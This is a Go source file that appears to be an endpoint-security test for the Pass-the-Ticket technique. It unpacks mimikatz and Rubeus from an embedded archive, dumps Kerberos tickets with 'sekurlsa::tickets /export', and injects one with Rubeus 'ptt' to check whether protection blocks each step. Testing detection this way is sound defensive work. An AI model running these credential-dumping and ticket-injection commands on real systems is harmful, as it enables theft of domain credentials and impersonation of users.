//go:build windows
// +build windows

/*
ID: a938af6c-808d-4db8-90df-7ce97ec70cc9
NAME: Pass-the-Ticket
TECHNIQUE: T1558
UNIT: response
CREATED: 2023-08-23 15:40:37.795285
*/
package main

import (
	"archive/zip"
	"bytes"
	"embed"
	"io"
	"path/filepath"
	"strings"

	Dropper "github.com/preludeorg/libraries/go/tests/dropper"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

//go:embed tooling.zip
var toolingFS embed.FS

func applyTicket(ticket string) {
	applyTicketCommand := []string{".\\Rubeus.exe", "ptt", "/ticket:" + ticket}

	Endpoint.Say("Executing Rubeus")
	out, err := Endpoint.Shell(applyTicketCommand)
	Endpoint.Say(out)
	if err != nil {
		Endpoint.Say("Rubeus execution was prevented with error: \"%v\"", err)
		Endpoint.Stop(Endpoint.ExecutionPrevented)
	}
	Endpoint.Say("Rubeus was not blocked")
}

func dumpTickets() string {
	dumpTicketsCommand := []string{"cmd.exe", "/c", ".\\mimikatz.exe", "privilege::debug", "sekurlsa::tickets /export", "exit"}

	Endpoint.Say("Executing Mimikatz")
	_, err := Endpoint.Shell(dumpTicketsCommand)
	if err != nil {
		Endpoint.Say("Mimikatz execution was prevented with error: \"%v\"", err)
		Endpoint.Stop(Endpoint.ExecutionPrevented)
	}
	Endpoint.Say("Mimikatz was not blocked")

	matches, err := filepath.Glob("./*.kirbi")
	if err != nil || len(matches) == 0 {
		Endpoint.Say("No kirbi files found")
		Endpoint.Stop(Endpoint.ExecutionPrevented) // able to execute mimikatz, but kirbi files not written
	}
	Endpoint.Say("Found exported ticket kirbi files!")
	return matches[0]
}

func unzipAndDropFiles(filename string) {
	zipData, err := toolingFS.ReadFile("tooling.zip")
	if err != nil {
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	zipReader, err := zip.NewReader(bytes.NewReader(zipData), int64(len(zipData)))
	if err != nil {
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	for _, file := range zipReader.File {
		if file.Name != filename {
			continue
		}

		fileReader, err := file.Open()
		if err != nil {
			Endpoint.Stop(Endpoint.UnexpectedTestError)
		}
		defer fileReader.Close()

		contents, err := io.ReadAll(fileReader)
		if err != nil {
			Endpoint.Stop(Endpoint.UnexpectedTestError)
		}

		if err := Endpoint.Dropper(Dropper.Dropper); err != nil {
			Endpoint.Say("Got error writing dropper: %v", err)
			Endpoint.Stop(Endpoint.FileQuarantinedOnExtraction)
		}
		if Endpoint.Quarantined(filename, contents) {
			Endpoint.Say(filename + " was caught!")
			Endpoint.Stop(Endpoint.FileQuarantinedOnExtraction)
		}
	}
}

func ADJoined() bool {
	Endpoint.Say("Checking if endpoint is connected to Active Directory")
	command := []string{"powershell.exe", "-c", "(Get-WmiObject Win32_ComputerSystem).PartOfDomain"}
	out, err := Endpoint.Shell(command)
	if err != nil {
		Endpoint.Say("Got error \"%v\" when performing AD check", err)
		return false
	}
	return !strings.Contains(out, "False")
}

func test() {
	if !Endpoint.CheckAdmin() {
		Endpoint.Say("Test not running with sufficient privileges")
		Endpoint.Stop(Endpoint.InsufficientPrivileges)
	}
	if !ADJoined() {
		Endpoint.Say("Endpoint not connected to Active Directory")
		Endpoint.Stop(Endpoint.NotRelevant)
	}

	filename := []string{"mimikatz.exe", "Rubeus.exe"}
	for _, file := range filename {
		unzipAndDropFiles(file)
	}

	ticket := dumpTickets()
	applyTicket(ticket)

	Endpoint.Stop(Endpoint.Unprotected)
}

func main() {
	Endpoint.Start(test)
}
